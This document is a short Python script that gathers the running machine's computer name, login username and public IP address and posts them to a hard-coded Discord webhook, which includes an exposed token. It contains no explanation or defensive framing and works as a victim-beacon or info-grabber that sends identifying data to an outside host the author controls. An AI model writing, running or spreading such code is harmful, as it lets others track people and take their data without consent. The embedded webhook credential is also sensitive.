import requests
import socket
import platform
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1452339182759575667/ZPJmenmty6Oe_73Rrs7IlmOIJ6aM1a0dW4sJWW_7Ks2aDznpoV2Z3-Bo0ivcks5VI3tO"

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "Unknown"

def get_username():
    try:
        return os.getlogin()
    except:
        return "Unknown"

computer_name = platform.node()
username = get_username()
public_ip = get_public_ip()

message = (
    "**System Info**\n"
    f"🖥️ Computer Name: `{computer_name}`\n"
    f"👤 Username: `{username}`\n"
    f"🌐 Public IP: `{public_ip}`"
)

data = {
    "content": message
}

response = requests.post(WEBHOOK_URL, json=data)

if response.status_code == 204:
    print("Sent successfully")
else:
    print("Failed:", response.status_code, response.text)
